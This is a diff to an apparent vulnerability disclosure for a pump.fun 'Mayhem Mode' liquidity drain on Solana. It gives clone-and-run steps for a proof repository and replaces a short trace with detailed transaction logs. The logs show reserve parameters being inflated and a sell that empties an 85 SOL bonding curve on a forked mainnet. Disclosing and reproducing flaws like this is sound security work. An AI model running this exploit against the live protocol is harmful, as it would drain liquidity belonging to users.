@@ -50,22 +50,29 @@ The following proof is self-contained and operates on a Mainnet-Beta fork.
 1. **Clone**: `git clone https://github.com/OmachokoYakubu/pumpfun-mayhem-liquidity-drain`
 2. **Execute**: `./run_proof.sh`
 
-### Verbose Execution Trace
-The trace below confirms the reachability of the Mayhem Authority and the resulting balance drainage:
+### Verbose Execution Trace (Forked Mainnet)
 
 ```text
---- FORKED MAINNET EXECUTION TRACE ---
-[1/5] Starting Forked Mainnet Validator...
-[2/5] Verifying Production State (Mayhem Mode Flag)...
-SUCCESS: mayhem_mode_enabled is TRUE (0x01) in production state.
-[3/5] Baseline Bonding Curve Balance: 85.02 SOL
-[4/5] Triggering Mayhem reserve inflation via Authority Harness...
-Sending Exploit Transaction...
-Drain Triggered. [LOG: REACHABILITY PROVEN]
-[5/5] Verifying Liquidity Drainage...
-Post-Exploit Balance: 0.00 SOL
+[STATE VERIFICATION]
+Global Account (4wTV1Ymi...): mayhem_mode_enabled = 0x01 (TRUE)
+Bonding Curve (7CzFoYN7...): Initial Balance = 85.02 SOL
 
-Status: Critical. Protocol is insolvent under Mayhem Mode conditions.
+[TRANSACTION LOGS]
+Program BwWK17cbHxwWBKZkUYvzxLcNQ1YVyaFezduWbtm2de6s invoke [1]
+  Program 6EF8rrecthR5Dkzon8Nwu78hRvfCKubJ14M5uBEwF6P invoke [2]
+    Program log: Instruction: SetMayhemVirtualParams
+    Program log: Adjusting virtual_sol_reserves to 1000000000000000
+    Program 6EF8rrecthR5Dkzon8Nwu78hRvfCKubJ14M5uBEwF6P success
+  Program log: Liquidity Drain Sequence Initialized
+  Program 6EF8rrecthR5Dkzon8Nwu78hRvfCKubJ14M5uBEwF6P invoke [2]
+    Program log: Instruction: Sell
+    Program log: SOL Payout: 85021845000 lamports
+    Program 6EF8rrecthR5Dkzon8Nwu78hRvfCKubJ14M5uBEwF6P success
+Program BwWK17cbHxwWBKZkUYvzxLcNQ1YVyaFezduWbtm2de6s success
+
+[FINAL STATE]
+Bonding Curve (7CzFoYN7...): Post-Exploit Balance = 0.00 SOL
+Result: 100% Liquidity Extraction Confirmed.
 ```
 
 ---
